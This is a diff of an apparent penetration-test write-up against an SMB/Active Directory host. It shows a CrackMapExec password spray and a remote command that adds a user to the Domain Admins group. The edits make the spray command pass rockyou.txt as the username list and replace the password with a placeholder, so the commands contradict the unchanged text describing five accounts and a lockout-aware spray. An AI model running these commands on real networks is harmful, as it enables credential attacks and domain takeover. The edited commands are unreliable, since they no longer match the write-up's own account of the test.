@@ -22,7 +22,7 @@ Confirmed SMB (445) open on the target.
 
 **2. Password spray via CrackMapExec**
 ```bash
-crackmapexec smb 10.0.2.200 -u users.txt -p passwords.txt
+crackmapexec smb 10.0.2.200 -u rockyou.txt -p password.txt
 ```
 `users.txt` contained 5 domain accounts (`Admin1`, `BigGen`, `NightMan`, `serv-app`, `Employee1`); `passwords.txt` contained 5 candidate passwords, keeping per-account attempts at or below a typical 3-attempt lockout policy.
 
@@ -38,7 +38,7 @@ Confirmed remote code execution against the target using the compromised account
 
 **4. Attempted privilege escalation**
 ```bash
-crackmapexec smb 10.0.2.200 -u Employee1 -p 'Summer2026!' -x "net group \"Domain Admins\" Employee1 /add /domain"
+crackmapexec smb 10.0.2.200 -u Employee1 -p 'correct password' -x "net group \"Domain Admins\" Employee1 /add /domain"
 ```
 CrackMapExec returned a `[+]` (execution succeeded), but this only confirms the *remote command ran* — not that its own logic succeeded.
 
